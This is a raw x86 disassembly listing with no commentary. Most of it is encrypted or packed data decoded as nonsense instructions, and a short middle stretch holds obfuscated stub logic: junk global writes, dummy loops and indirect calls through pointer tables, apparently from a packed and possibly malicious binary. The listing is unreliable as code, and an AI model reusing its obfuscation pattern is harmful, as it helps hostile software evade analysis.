  4137f8:	cmp    BYTE PTR [eax+0x79dfd4b4],ch
  4137fe:	sbb    BYTE PTR [ebp+0x53fc633f],cl
  413804:	mul    BYTE PTR [edx+0x5cf1df12]
  41380a:	fdiv   DWORD PTR [ebx-0x18460c8f]
  413810:	fsin   
  413812:	ffree  st(3)
  413814:	jg     0x4137e7
  413816:	outs   dx,BYTE PTR ds:[esi]
  413817:	enter  0x4d36,0x17
  41381b:	(bad)  
  41381c:	ficomp DWORD PTR gs:[edi]
  41381f:	repz inc ecx
  413821:	push   cs
  413822:	lods   eax,DWORD PTR ds:[esi]
  413823:	test   al,0x32
  413825:	ds or  al,0x50
  413828:	in     al,0xba
  41382a:	(bad)  
  41382b:	popf   
  41382c:	mov    DWORD PTR [eax+ecx*1-0x25],esi
  413830:	inc    ebx
  413831:	or     BYTE PTR [ecx],ah
  413833:	loop   0x4137d2
  413835:	and    bh,BYTE PTR [esi+0x69a8264e]
  41383b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41383c:	mov    ecx,0xc0249b69
  413841:	xchg   ecx,eax
  413842:	sub    eax,0x1e4b1880
  413847:	sbb    edi,edi
  413849:	pop    eax
  41384a:	je     0x41389b
  41384c:	xor    cl,BYTE PTR [ebp-0xb]
  41384f:	xor    ebp,DWORD PTR [edx-0x3d]
  413852:	jle    0x413886
  413854:	or     bl,BYTE PTR [ebx]
  413856:	nop
  413857:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413859:	shl    ch,cl
  41385b:	or     cl,BYTE PTR [ebp-0x354510c8]
  413861:	test   DWORD PTR [edx],eax
  413863:	or     ebx,ecx
  413865:	cmp    DWORD PTR [ebp+ebx*1+0x3c],esp
  413869:	push   esp
  41386a:	pushf  
  41386b:	dec    edi
  41386c:	inc    edx
  41386d:	inc    edi
  41386e:	xchg   edi,eax
  41386f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413870:	mov    WORD PTR [esi],ds
  413872:	pop    ss
  413873:	and    al,0x15
  413875:	les    ebx,FWORD PTR es:[ebx-0x23]
  413879:	std    
  41387a:	enter  0xdb3,0xe
  41387e:	jl     0x413887
  413880:	push   0xffffffa5
  413882:	imul   esi,DWORD PTR [edx+0x48],0xec7d172e
  413889:	lock mov edi,0xba7c9b00
  41388f:	loope  0x4138ca
  413891:	push   eax
  413892:	mov    cl,0xa2
  413894:	clc    
  413895:	xchg   ebp,eax
  413896:	mov    esp,0x84c697fe
  41389b:	lds    ebx,FWORD PTR [esi]
  41389d:	ja     0x41390f
  41389f:	add    DWORD PTR [edx-0x55],ebp
  4138a2:	lock fld TBYTE PTR [edx+0x299d77f6]
  4138a9:	jge    0x413903
  4138ab:	or     BYTE PTR [edi+0x7343214c],bl
  4138b1:	xor    edx,DWORD PTR [eax-0x652ec64e]
  4138b7:	lods   al,BYTE PTR ds:[esi]
  4138b8:	out    dx,eax
  4138b9:	pushf  
  4138ba:	ror    ebp,0x43
  4138bd:	jmp    0xcc1ad3f6
  4138c2:	lea    edi,[edi-0x32d3c5c8]
  4138c8:	adc    ecx,DWORD PTR [edx+ecx*4-0x72]
  4138cc:	imul   ecx,DWORD PTR [esi-0x34],0xa571ca1e
  4138d3:	ds daa 
  4138d5:	mov    esp,0x8d641d7
  4138da:	psubusb mm2,mm2
  4138dd:	mov    eax,0x1c2ff3eb
  4138e2:	push   edx
  4138e3:	or     eax,DWORD PTR [eax-0x5218986f]
  4138e9:	push   0x13
  4138eb:	aam    0xdf
  4138ed:	ins    BYTE PTR es:[edi],dx
  4138ee:	xor    ah,BYTE PTR [esi+eiz*4-0x1d]
  4138f2:	add    edx,DWORD PTR [ebx]
  4138f4:	xor    dh,BYTE PTR [eax-0x4e]
  4138f7:	retf   
  4138f8:	ret    
  4138f9:	(bad)  
  4138fa:	mov    ds:0xf8bdbc0b,eax
  4138ff:	pop    ds
  413900:	push   cs
  413901:	xchg   esi,eax
  413902:	and    BYTE PTR [ebp+0x15],ah
  413905:	or     DWORD PTR [eax-0x28],0x369d6315
  41390c:	cmp    BYTE PTR [ebx-0x33134f0a],bl
  413912:	cwde   
  413913:	in     al,0x48
  413915:	cmp    eax,0x3c458c41
  41391a:	jmp    0x44ce:0xa626cca1
  413921:	fild   DWORD PTR [ecx-0x53dc8813]
  413927:	shl    BYTE PTR [ebx+edi*4+0x895e497],0xa2
  41392f:	pop    ecx
  413930:	leave  
  413931:	mov    dl,0xf6
  413933:	adc    BYTE PTR ds:[ebp-0x7e],dh
  413937:	push   ds
  413938:	jns    0x413979
  41393a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41393b:	dec    edi
  41393c:	pop    ebx
  41393d:	enter  0xb519,0xa0
  413941:	push   es
  413942:	jb     0x4138c7
  413944:	mov    ebp,0x53242068
  413949:	adc    eax,0x691ac204
  41394e:	or     ecx,esp
  413950:	mov    DWORD PTR [ecx+0xc48dbc],esi
  413956:	fisubr DWORD PTR [ebx+0x7f1b94a0]
  41395c:	lds    ebx,FWORD PTR [edx-0x148fa9c8]
  413962:	outs   dx,DWORD PTR ds:[esi]
  413963:	into   
  413964:	pop    edx
  413965:	jbe    0x413996
  413967:	push   esi
  413968:	xchg   ebp,eax
  413969:	imul   ebp,DWORD PTR [ecx],0xffffffb1
  41396c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41396d:	popf   
  41396e:	stos   BYTE PTR es:[edi],al
  41396f:	sbb    esp,DWORD PTR [ecx+eiz*2+0x53]
  413973:	push   eax
  413974:	xor    al,bl
  413976:	test   al,0x3b
  413978:	and    ch,ch
  41397a:	into   
  41397b:	loope  0x4139d6
  41397d:	out    dx,al
  41397e:	jle    0x4139c1
  413980:	loopne 0x413940
  413982:	inc    esp
  413983:	add    eax,0x9813530
  413988:	jle    0x4139c8
  41398a:	in     eax,dx
  41398b:	dec    ecx
  41398c:	popf   
  41398d:	mov    al,BYTE PTR [edx-0x550cad59]
  413993:	(bad)  
  413994:	jmp    0xf8ba:0x9f82b2f5
  41399b:	sub    BYTE PTR ds:0xbe087125,bh
  4139a1:	push   edi
  4139a2:	dec    eax
  4139a3:	mov    edx,0xa7036ace
  4139a8:	stos   BYTE PTR es:[edi],al
  4139a9:	sbb    al,0xb5
  4139ab:	mov    cl,0xdb
  4139ad:	(bad)  
  4139ae:	(bad)  
  4139af:	jae    0x413966
  4139b1:	push   edx
  4139b2:	aam    0xad
  4139b4:	sbb    BYTE PTR [ebx+0xec2c821],ch
  4139ba:	shl    BYTE PTR [edx-0x32],1
  4139bd:	ss push es
  4139bf:	std    
  4139c0:	arpl   si,ax
  4139c2:	or     DWORD PTR [edi],edx
  4139c4:	jns    0x4139ed
  4139c6:	icebp  
  4139c7:	jno    0x41399b
  4139c9:	not    BYTE PTR [eax]
  4139cb:	cld    
  4139cc:	jns    0x4139d7
  4139ce:	fcmovu st,st(5)
  4139d0:	add    DWORD PTR [ebx+0x6219b512],ebp
  4139d6:	cmp    dl,BYTE PTR [edx+edi*2+0x5979910b]
  4139dd:	add    eax,0x74bb03d8
  4139e2:	mov    WORD PTR [edx+0x71765c1],?
  4139e8:	ficom  DWORD PTR [eax]
  4139ea:	or     BYTE PTR [ecx-0x45adcab9],ah
  4139f0:	(bad)
  4139f4:	fistp  DWORD PTR [ecx-0x34f90219]
  4139fa:	jo     0x4139c8
  4139fc:	push   ebx
  4139fd:	sbb    eax,0xf70e8196
  413a02:	aaa    
  413a03:	push   es
  413a04:	xlat   BYTE PTR ds:[ebx]
  413a05:	inc    eax
  413a06:	scas   al,BYTE PTR es:[edi]
  413a07:	xor    dh,BYTE PTR [edi]
  413a09:	cmp    cl,BYTE PTR [edx-0x22]
  413a0c:	sbb    edx,DWORD PTR [eax+ecx*2]
  413a0f:	dec    ecx
  413a10:	(bad)  
  413a11:	mov    ?,WORD PTR [edi]
  413a13:	(bad)  
  413a14:	sub    DWORD PTR [ebp-0x1b572e2],ebp
  413a1a:	pushf  
  413a1b:	or     eax,0x3e37c23c
  413a20:	add    DWORD PTR [esi+0x0],0xa7eb46db
  413a27:	stc    
  413a28:	jno    0x4139e8
  413a2a:	pop    edi
  413a2b:	dec    ebx
  413a2c:	or     BYTE PTR [ebx+0x1f],dh
  413a2f:	lock and eax,0xf5725eca
  413a35:	aad    0x2
  413a37:	iret   
  413a38:	or     edx,DWORD PTR [ecx]
  413a3a:	or     cl,ah
  413a3c:	pop    es
  413a3d:	rol    BYTE PTR [eax+eax*8],cl
  413a40:	and    DWORD PTR [edx+0x696f4741],ebp
  413a46:	test   esi,eax
  413a48:	pop    ds
  413a49:	jb     0x413a25
  413a4b:	add    DWORD PTR [esi],0x269c65aa
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	jne    0x4139f1
  413a69:	push   0x6a
  413a6b:	jle    0x413ad5
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0x6970707e
  413a74:	aaa    
  413a75:	inc    ebx
  413a76:	scas   al,BYTE PTR es:[edi]
  413a77:	mov    ds,WORD PTR [ebp-0x20588e8a]
  413a7d:	add    bh,ah
  413a7f:	push   ss
  413a80:	or     cl,BYTE PTR [edx+0x49]
  413a83:	jns    0x413ad8
  413a85:	adc    al,0xd8
  413a87:	pushf  
  413a88:	pop    es
  413a89:	or     eax,0xa3ac9570
  413a8e:	aaa    
  413a8f:	rcl    BYTE PTR [edx],cl
  413a91:	mov    edi,0x6106d1fe
  413a96:	sub    cl,BYTE PTR [ecx+esi*8]
  413a99:	in     eax,0x60
  413a9b:	and    al,0xb8
  413a9d:	xchg   esp,eax
  413a9e:	xchg   ebp,eax
  413a9f:	fsubr  st,st(6)
  413aa1:	in     al,0xe6
  413aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aa4:	lods   al,BYTE PTR ds:[esi]
  413aa5:	ja     0x413a76
  413aa7:	nop
  413aa8:	add    dh,0x71
  413aab:	jle    0x413b08
  413aad:	js     0x413aa1
  413aaf:	and    DWORD PTR [edi+0x4a0996bc],ecx
  413ab5:	sahf   
  413ab6:	cmp    BYTE PTR [ebx+esi*1],0x8f
  413aba:	mov    cl,0x3f
  413abc:	clc    
  413abd:	mov    cl,BYTE PTR ds:0x661cbfde
  413ac3:	inc    esi
  413ac4:	in     al,dx
  413ac5:	cmp    BYTE PTR [edx+0x7e1f0553],0x5a
  413acc:	mov    ebx,0x6da4336b
  413ad1:	fwait
  413ad2:	or     ebx,DWORD PTR [esi-0x47c3ed1e]
  413ad8:	xchg   edx,eax
  413ad9:	aas    
  413ada:	push   ebx
  413adb:	adc    eax,0x55bbd23a
  413ae0:	pusha  
  413ae1:	repnz add esi,ebp
  413ae4:	xor    BYTE PTR [edx],al
  413ae6:	repnz es inc esp
  413ae9:	or     bh,BYTE PTR [esi+esi*4-0x7a]
  413aed:	xchg   edx,eax
  413aee:	lods   al,BYTE PTR ds:[esi]
  413aef:	out    dx,al
  413af0:	popf   
  413af1:	fs aad 0xeb
  413af4:	mov    ds:0x9c056a46,al
  413af9:	mov    edx,0xf4ee7de6
  413afe:	or     BYTE PTR [ecx-0x78],al
  413b01:	dec    edi
  413b02:	sub    cl,BYTE PTR [ebp-0x3a08e7bc]
  413b08:	pushf  
  413b09:	data16 scas al,BYTE PTR es:[edi]
  413b0b:	mov    esi,DWORD PTR [ecx]
  413b0d:	jae    0x413ae9
  413b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b10:	ficom  DWORD PTR [esi-0x4706ad97]
  413b16:	jmp    0x413ad3
  413b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b19:	jne    0x413b42
  413b1b:	adc    esi,DWORD PTR cs:[ebx+0x7f751ec1]
  413b22:	push   ds
  413b23:	fdivr  DWORD PTR [edi-0x30]
  413b26:	inc    edi
  413b27:	cmp    bl,BYTE PTR [edx+ebp*1]
  413b2a:	mov    ds:0xe871fe6a,al
  413b2f:	dec    esi
  413b30:	mov    esi,0xb85d9716
  413b35:	xor    eax,0x6b552fb4
  413b3a:	mov    esp,0x78f1d143
  413b3f:	clc    
  413b40:	sti    
  413b41:	leave  
  413b42:	in     eax,dx
  413b43:	pop    es
  413b44:	rcl    ebp,0x4
  413b47:	aam    0xe2
  413b49:	xor    DWORD PTR [edi],edi
  413b4b:	sbb    cl,ah
  413b4d:	jmp    0x413b2b
  413b4f:	push   0x20300aa2
  413b54:	pushf  
  413b55:	or     al,0xed
  413b57:	inc    ebx
  413b58:	inc    bp
  413b5a:	mov    edi,DWORD PTR [edx+0x7]
  413b5d:	aas    
  413b5e:	adc    ax,0x4e69
  413b62:	data16 fiadd DWORD PTR [ebx]
  413b65:	call   0xaef0a4a9
  413b6a:	and    eax,0x2fd358dc
  413b6f:	ds clc 
  413b71:	jo     0x413bce
  413b73:	jne    0x413b70
  413b75:	push   eax
  413b76:	mov    fs,WORD PTR [edi-0x3d0a7ae]
  413b7c:	gs mov edx,0xcc9a30bd
  413b82:	dec    ebx
  413b83:	out    dx,eax
  413b84:	test   DWORD PTR [esi-0x758b341f],0x347b2cb2
  413b8e:	iret   
  413b8f:	imul   ecx,DWORD PTR [eax+0x6bb05e73],0xdf7bdaa
  413b99:	jg     0x413be6
  413b9b:	data16 scas al,BYTE PTR es:[edi]
  413b9d:	fwait
  413b9e:	stc    
  413b9f:	stos   BYTE PTR es:[edi],al
  413ba0:	aas    
  413ba1:	pop    eax
  413ba2:	and    dh,ah
  413ba4:	shr    ch,1
  413ba6:	(bad)  
  413ba7:	cs (bad) 
  413ba9:	fmul   st(7),st
  413bab:	mov    ebp,0x163cc4a0
  413bb0:	jne    0x413b6d
  413bb2:	or     BYTE PTR [ebx],cl
  413bb4:	arpl   WORD PTR [esi],bp
  413bb6:	add    eax,0x64a8fa55
  413bbb:	push   es
  413bbc:	xchg   esi,eax
  413bbd:	fimul  DWORD PTR [edi-0x5d]
  413bc0:	and    DWORD PTR [eax],esi
  413bc2:	add    DWORD PTR [eax+edx*1+0x46],0x5e
  413bc7:	jne    0x413c21
  413bc9:	mov    bl,0x1e
  413bcb:	adc    al,0xeb
  413bcd:	add    bl,al
  413bcf:	nop
  413bd0:	mov    DWORD PTR [eax+0x3e],ecx
  413bd3:	sbb    eax,0x24305050
  413bd8:	ins    BYTE PTR es:[edi],dx
  413bd9:	cmp    DWORD PTR [ebp-0x1dfac78b],ebx
  413bdf:	imul   ecx,eax,0xffffffc4
  413be2:	mov    ecx,0x51bef05a
  413be7:	mov    cl,0xc0
  413be9:	ins    DWORD PTR es:[edi],dx
  413bea:	inc    esp
  413beb:	outs   dx,BYTE PTR ds:[esi]
  413bec:	ret    
  413bed:	mov    ds:0xdcb541d0,al
  413bf2:	aam    0xaa
  413bf4:	add    cl,al
  413bf6:	call   0xe565:0xcb5177ea
  413bfd:	push   ds
  413bfe:	or     BYTE PTR [eax],dh
  413c00:	aad    0xbb
  413c02:	push   0xd04918d1
  413c07:	add    BYTE PTR [edi-0x4516f6ab],al
  413c0d:	out    dx,al
  413c0e:	rcr    BYTE PTR [edx+0x65],1
  413c11:	stos   BYTE PTR es:[edi],al
  413c12:	sbb    ch,ah
  413c14:	mov    ch,0xba
  413c16:	bound  edx,QWORD PTR [eax]
  413c18:	inc    esi
  413c19:	je     0x413c2c
  413c1b:	sbb    dl,0xfa
  413c1e:	aam    0xea
  413c20:	inc    ecx
  413c21:	inc    edx
  413c22:	inc    edx
  413c23:	mov    al,BYTE PTR [edi+edx*1]
  413c26:	outs   dx,BYTE PTR ds:[esi]
  413c27:	(bad)  
  413c28:	int    0xf0
  413c2a:	(bad)  
  413c2b:	xchg   ebx,eax
  413c2c:	jle    0x413bec
  413c2e:	adc    al,0x67
  413c30:	pop    esi
  413c31:	xor    al,0xb7
  413c33:	push   ecx
  413c34:	push   esp
  413c35:	mov    cl,BYTE PTR [esi-0x7d3bfabe]
  413c3b:	adc    DWORD PTR ds:0x2d05a8cd,0xffffffcd
  413c42:	nop
  413c43:	sub    edi,DWORD PTR [eax+esi*2-0x5b]
  413c47:	add    BYTE PTR [ebp-0xe],bh
  413c4a:	xchg   esp,eax
  413c4b:	ins    BYTE PTR es:[edi],dx
  413c4c:	dec    edx
  413c4d:	or     BYTE PTR [ebp+edi*4-0x17],bh
  413c51:	or     ebp,DWORD PTR [edi-0x62e94786]
  413c57:	retf   0xac95
  413c5a:	xchg   esi,eax
  413c5b:	xor    ch,BYTE PTR [eax+0x19]
  413c5e:	adc    ebx,esp
  413c60:	repnz adc eax,0xa788d2f0
  413c66:	xlat   BYTE PTR ds:[ebx]
  413c67:	(bad)  
  413c68:	leave  
  413c69:	adc    edi,DWORD PTR [ebx+0x569cd271]
  413c6f:	adc    BYTE PTR [ebp+0x49],ch
  413c72:	push   esi
  413c73:	jnp    0x413cc6
  413c75:	neg    DWORD PTR [ebx-0x1c]
  413c78:	pop    esi
  413c79:	fcmovbe st,st(7)
  413c7b:	adc    eax,0x23e586c8
  413c80:	(bad)  
  413c81:	shl    BYTE PTR [ecx-0x3de1378a],cl
  413c87:	outs   dx,DWORD PTR ds:[esi]
  413c88:	rcr    DWORD PTR [ebx-0x3e579cae],cl
  413c8e:	sub    DWORD PTR [ebx+0x5373a71a],ebx
  413c94:	inc    ebx
  413c96:	fst    QWORD PTR [edx-0x681fea55]
  413c9c:	ds push esi
  413c9e:	jno    0x413c91
  413ca0:	push   ebp
  413ca1:	mov    ds:0x108e41c5,al
  413ca6:	and    bl,BYTE PTR [edi+edi*1+0x2b362856]
  413cad:	add    eax,0xdbee505a
  413cb2:	sbb    BYTE PTR [ebx-0x30],al
  413cb5:	cwde   
  413cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cb7:	aam    0xb1
  413cb9:	dec    edx
  413cba:	(bad)  [ecx+0x57]
  413cbd:	fs mov esi,0xedc12ceb
  413cc3:	bound  esp,QWORD PTR [esi-0x50]
  413cc6:	xchg   ebx,eax
  413cc7:	mov    edi,0xe75fade8
  413ccc:	xchg   esp,eax
  413ccd:	push   0x7c
  413ccf:	loop   0x413cf1
  413cd1:	mov    eax,ds:0x6199f01e
  413cd6:	dec    eax
  413cd7:	sub    DWORD PTR [esi+0x3b8f2dfe],esp
  413cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cde:	jno    0x413d14
  413ce0:	and    DWORD PTR [esi+0x6],eax
  413ce3:	rol    BYTE PTR [ecx],cl
  413ce5:	cmp    cl,0xc3
  413ce8:	push   es
  413ce9:	adc    bl,cl
  413ceb:	or     eax,ebx
  413ced:	xor    ecx,DWORD PTR [edx]
  413cef:	or     BYTE PTR [edi-0x7b99adb3],al
  413cf5:	mov    bh,0xce
  413cf7:	(bad)  
  413cf8:	dec    esp
  413cf9:	std    
  413cfa:	ins    DWORD PTR es:[edi],dx
  413cfb:	adc    dl,BYTE PTR [ebp+esi*4+0x20833b72]
  413d02:	mov    ecx,0xf9a515f1
  413d07:	fwait
  413d08:	cmp    al,0xb2
  413d0a:	arpl   WORD PTR [esi],di
  413d0c:	shr    DWORD PTR [edx],1
  413d0e:	mov    dl,BYTE PTR [eax+0x4e]
  413d11:	in     eax,0x5
  413d13:	stos   BYTE PTR es:[edi],al
  413d14:	pop    esi
  413d15:	xor    eax,0xd7ce8227
  413d1a:	xor    bl,BYTE PTR [edx-0x68]
  413d1d:	sub    bl,bh
  413d1f:	push   ebp
  413d20:	das    
  413d21:	and    al,0x44
  413d23:	hlt    
  413d24:	loope  0x413d41
  413d26:	loope  0x413cbc
  413d28:	mov    ?,edx
  413d2a:	sbb    bl,al
  413d2c:	push   eax
  413d2d:	(bad)  
  413d2e:	fwait
  413d2f:	xchg   edx,eax
  413d30:	sub    DWORD PTR [ebx-0x44228498],esi
  413d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d37:	lods   eax,DWORD PTR ds:[esi]
  413d38:	stos   DWORD PTR es:[edi],eax
  413d39:	xlat   BYTE PTR ds:[ebx]
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e7ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e7ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e7ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e66b
  413d7f:	cmp    DWORD PTR ds:0x42e7ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e7ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e7ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e7ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e7ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e80f,0x42fe86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e22c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e7f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fdd9,0x42e220
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e7fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e7fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e7fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e7fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e7fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e58b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fe01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e7f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e803
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e21c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e7fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	pop    DWORD PTR [ecx+0x4760950b]
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e5e
  413e98:	aas    
  413e99:	hlt    
  413e9a:	jbe    0x413e95
  413e9c:	xchg   ecx,eax
  413e9d:	in     eax,0x38
  413e9f:	ja     0x413ec6
  413ea1:	push   0x58
  413ea3:	cmc    
  413ea4:	xchg   esi,eax
  413ea5:	(bad)  
  413ea6:	cdq    
  413ea7:	jl     0x413e32
  413ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eaa:	imul   BYTE PTR [ebx]
  413eac:	xchg   ebp,eax
  413ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eae:	fs hlt 
  413eb0:	fsubr  st(6),st
  413eb2:	fs stc 
  413eb4:	xor    dh,BYTE PTR [eax-0xd07838f]
  413eba:	pusha  
  413ebb:	and    eax,0x529fc8b4
  413ec0:	dec    ebx
  413ec1:	inc    ebp
  413ec2:	leave  
  413ec3:	xchg   ah,bl
  413ec5:	sbb    esi,ebx
  413ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec8:	mov    al,0x2e
  413eca:	jle    0x413e61
  413ecc:	mov    edx,0xf4a0f8f2
  413ed1:	xchg   edx,eax
  413ed2:	mov    ebp,0x93b4e60
  413ed7:	push   es
  413ed8:	fdiv   st,st(7)
  413eda:	gs call 0xc772:0x81a2f7be
  413ee2:	xor    eax,0xa846633
  413ee7:	cmp    al,0x49
  413ee9:	ins    DWORD PTR es:[edi],dx
  413eea:	sbb    al,0x2a
  413eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eed:	xlat   BYTE PTR ds:[ebx]
  413eee:	sub    esp,DWORD PTR [eax]
  413ef0:	mov    ebp,0xa73d54aa
  413ef5:	cmp    BYTE PTR [ecx-0x35],ah
  413ef8:	loope  0x413f3d
  413efa:	mov    eax,ds:0x3b73e346
  413eff:	sub    BYTE PTR [esi-0x6cb6ca0f],dl
  413f05:	bound  edi,QWORD PTR [edx-0x20]
  413f08:	xchg   esp,eax
  413f09:	mov    BYTE PTR [ecx+0xe],cl
  413f0c:	push   0x31
  413f0e:	cdq    
  413f0f:	(bad)  
  413f10:	push   ds
  413f11:	mov    al,0xfe
  413f13:	jge    0x413ec9
  413f15:	push   es
  413f16:	mov    ch,0xea
  413f18:	in     al,0x60
  413f1a:	dec    esp
  413f1c:	pop    eax
  413f1d:	lea    ecx,ds:0x2ea52b97
  413f23:	inc    ebx
  413f24:	inc    ecx
  413f25:	enter  0xd285,0x85
  413f29:	mov    BYTE PTR [eax+0x395198e7],dh
  413f2f:	push   esp
  413f30:	in     eax,0x4c
  413f32:	pop    esi
  413f33:	sbb    bl,BYTE PTR [eax+edi*1+0x5320b2c2]
  413f3a:	jmp    0xe894e305
  413f3f:	call   DWORD PTR [eax]
  413f41:	or     ch,ch
  413f43:	fs mov dl,0x40
  413f46:	push   ebx
  413f47:	nop
  413f48:	repnz cdq 
  413f4a:	mov    dh,0xb5
  413f4c:	push   edx
  413f4d:	jl     0x413f06
  413f4f:	ja     0x413f9e
  413f51:	aas    
  413f52:	mov    cl,0xfc
  413f54:	nop
  413f55:	or     eax,0x4b89e4c2
  413f5a:	inc    esi
  413f5b:	int3   
  413f5c:	xchg   ebx,eax
  413f5d:	and    eax,0x771ba865
  413f62:	mov    ds:0x10a6d782,eax
  413f67:	xchg   edi,eax
  413f68:	inc    eax
  413f69:	imul   edx,edi,0x5f
  413f6c:	add    eax,0x7b904bca
  413f71:	add    edi,DWORD PTR [eax-0x3b]
  413f74:	repz out dx,al
  413f76:	les    eax,FWORD PTR [esi]
  413f78:	ds in  al,0x4
  413f7b:	jo     0x413f96
  413f7d:	pop    ds
  413f7e:	lods   al,BYTE PTR ds:[esi]
  413f7f:	fldenv [ecx+ebx*8-0x7af70bd6]
  413f86:	dec    ecx
  413f87:	mov    bh,0x9e
  413f89:	nop    ecx
  413f8c:	fmul   st(6),st
  413f8e:	or     al,0x6
  413f90:	ficomp DWORD PTR [esi+0x49be9814]
  413f96:	jg     0x413f8f
  413f98:	loope  0x413f3d
  413f9a:	xchg   ebx,eax
  413f9b:	nop
  413f9c:	mov    ds:0x7d8737b3,al
  413fa1:	xor    al,0x40
  413fa3:	or     eax,DWORD PTR [ebp+0x4d]
  413fa6:	iret   
  413fa7:	adc    cl,BYTE PTR ds:[ebx+0x922544c]
  413fae:	dec    edi
  413faf:	and    eax,0x48c4f205
  413fb4:	out    dx,al
  413fb5:	cmc    
  413fb6:	js     0x414031
  413fb8:	and    al,0xcd
  413fba:	popa   
  413fbb:	push   esp
  413fbc:	cmp    bh,BYTE PTR [esi+0x3811b414]
  413fc2:	in     al,dx
  413fc3:	dec    eax
  413fc4:	in     al,0xea
  413fc6:	mov    ebx,0x485a4cac
  413fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fcc:	out    dx,al
  413fcd:	pop    ebp
  413fce:	shr    ecx,cl
  413fd0:	adc    ebx,DWORD PTR [eax+0x73]
  413fd3:	mov    ds:0x127689f8,eax
  413fd8:	gs inc esi
  413fda:	ret    0x2e1
  413fdd:	mov    ds:0x4a168880,eax
  413fe2:	xchg   edi,eax
  413fe3:	test   eax,0xd294b514
  413fe8:	das    
  413fe9:	test   eax,0xb1007a28
  413fee:	inc    ecx
  413fef:	inc    edx
  413ff0:	mov    ebp,0xdf1f0155
  413ff5:	jmp    0x414014
  413ff7:	xor    eax,0xeddecce2
  413ffc:	pop    edi
  413ffd:	or     BYTE PTR [edx-0x7db2c81],dh
  414003:	adc    DWORD PTR [ebp-0x6b6cc129],eax
  414009:	imul   edi,DWORD PTR [ebp+0x7e],0x65
  41400d:	push   cs
  41400e:	bound  esi,QWORD PTR [edi+0x5745e7a6]
  414014:	push   ds
  414015:	mov    ch,0x6f
  414017:	sub    BYTE PTR [ecx+0x40b93058],ch
  41401d:	rcl    DWORD PTR [eax+0xa],cl
  414020:	jl     0x413faf
  414022:	sub    DWORD PTR [edx+eiz*1],ebx
  414025:	(bad)  
